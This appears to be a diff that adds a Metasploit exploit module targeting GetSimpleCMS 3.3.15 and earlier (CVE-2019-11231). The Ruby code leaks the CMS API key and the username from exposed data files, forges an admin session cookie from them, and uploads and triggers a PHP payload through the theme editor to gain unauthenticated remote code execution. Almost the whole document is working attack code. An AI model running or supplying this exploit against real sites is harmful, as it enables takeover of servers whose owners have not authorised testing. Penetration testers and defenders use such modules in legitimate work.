@@ -1,0 +1,178 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => "GetSimpleCMS Unauthenticated RCE",
+      'Description'    => %q{
+        This module exploits a vulnerability found in GetSimpleCMS,
+        which allows unauthenticated attackers to perform Remote Code Execution.
+        An arbitrary file upload (PHPcode for example) vulnerability can be triggered by an authenticated user,
+        however authentication can be bypassed by leaking the cms API key to target the session manager.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'truerand0m' #  Discovery, exploit and Metasploit from Khalifazo,incite_team
+        ],
+      'References'     =>
+        [
+          ['CVE', '2019-11231'],
+          ['URL', 'https://ssd-disclosure.com/archives/3899/ssd-advisory-getcms-unauthenticated-remote-code-execution'],
+        ],
+      'Payload'        =>
+        {
+          'BadChars' => "\x00"
+        },
+      'DefaultOptions'  =>
+        {
+          'EXITFUNC' => 'thread'
+        },
+      'Platform'       => 'php',
+      'Arch'           => ARCH_PHP,
+      'Targets'        =>
+        [
+          ['GetSimpleCMS 3.3.15 and before', {}]
+        ],
+      'Privileged'     => false,
+      'DisclosureDate' => "Apr 28 2019",
+      'DefaultTarget'  => 0))
+
+    register_options(
+      [
+        OptString.new('TARGETURI', [true, 'The base path to the cms', '/'])
+      ])
+  end
+
+  def gscms_version
+      res = send_request_cgi(
+        'method' => 'GET',
+        'uri'    => normalize_uri(target_uri.path, 'admin', '/')
+      )
+      return unless res && res.code == 200
+
+      generator = res.get_html_document.at(
+        '//script[@type = "text/javascript"]/@src'
+        )
+
+      fail_with(Failure::NotFound, 'Failed to retrieve generator') unless generator
+      vers = generator.value.split('?v=').last.gsub(".","")
+      return unless vers
+      @version = vers
+  end
+
+  def get_salt
+    uri = normalize_uri(target_uri.path, 'data', 'other', 'authorization.xml')
+    res = send_request_cgi(
+      'method' => 'GET',
+      'uri'    => uri
+    )
+    return unless res && res.code == 200
+
+    fail_with(Failure::NotFound, 'Failed to retrieve salt') if res.get_xml_document.at('apikey').nil?
+    @salt = res.get_xml_document.at('apikey').text
+  end
+
+  def get_user
+    uri = normalize_uri(target_uri.path, 'data', 'users' ,'/')
+    res = send_request_cgi(
+      'method' => 'GET',
+      'uri'    => uri
+    )
+    return unless res && res.code == 200
+
+    fail_with(Failure::NotFound, 'Failed to retrieve username') if res.get_html_document.at('[text()*="xml"]').nil?
+    @username = res.get_html_document.at('[text()*="xml"]').text.split('.xml').first
+  end
+
+  def gen_cookie(version,salt,username)
+    cookie_name = "getsimple_cookie_#{version}"
+    sha_salt_usr = Digest::SHA1.hexdigest("#{username}#{salt}")
+
+    sha_salt_cookie = Digest::SHA1.hexdigest("#{cookie_name}#{salt}")
+    @cookie = "GS_ADMIN_USERNAME=#{username};#{sha_salt_cookie}=#{sha_salt_usr}"
+  end
+  def get_nonce(cookie)
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri' => normalize_uri(target_uri,'admin','theme-edit.php'),
+      'cookie' =>  cookie,
+      'vars_get' => {
+          't' => 'Innovation',
+          'f' => 'Default Template',
+          's' => 'Edit'
+      }
+    })
+
+    fail_with(Failure::NotFound, 'Failed to retrieve nonce') if res.get_html_document.at('//input[@id = "nonce"]/@value').nil?
+    @nonce = res.get_html_document.at('//input[@id = "nonce"]/@value')
+  end
+
+  def exploit
+    unless check == CheckCode::Vulnerable
+        fail_with(Failure::NotVulnerable, 'It appears that the target is not vulnerable')
+    end
+    version = gscms_version
+    salt = get_salt
+    username = get_user
+    cookie = gen_cookie(version,salt,username)
+    nonce = get_nonce(cookie)
+
+    fname = "#{rand_text_alpha(6..16)}.php"
+    php   = %Q|<?php #{payload.encoded} ?>|
+    upload_file(cookie,nonce,fname,php)
+    send_request_cgi({
+        'method' => 'GET',
+        'uri'    => normalize_uri(target_uri.path,'theme',fname),
+    })
+  end
+
+  def check
+    version = gscms_version
+    unless version
+        return CheckCode::Safe
+    end
+    vprint_status "GetSimpleCMS version #{version}"
+    unless vulnerable
+        return CheckCode::Detected
+    end
+    CheckCode::Vulnerable
+  end
+
+  def vulnerable
+    uri = normalize_uri(target_uri.path, 'data', 'other', 'authorization.xml')
+    res = send_request_cgi(
+      'method' => 'GET',
+      'uri'    => uri
+    )
+    return unless res && res.code == 200
+
+    uri = normalize_uri(target_uri.path, 'data', 'users', '/')
+    res = send_request_cgi(
+      'method' => 'GET',
+      'uri'    => uri
+    )
+    return unless res && res.code == 200
+    return true
+  end
+
+  def upload_file(cookie,nonce,fname,content)
+    res = send_request_cgi({
+      'method'    => 'POST',
+      'uri'       => normalize_uri(target_uri.path,'admin','theme-edit.php'),
+      'cookie'    => cookie,
+      'vars_post' => {
+        'submitsave'    => 2,
+        'edited_file' => fname,
+        'content' => content,
+        'nonce' => nonce
+      }
+    })
+  end
+end
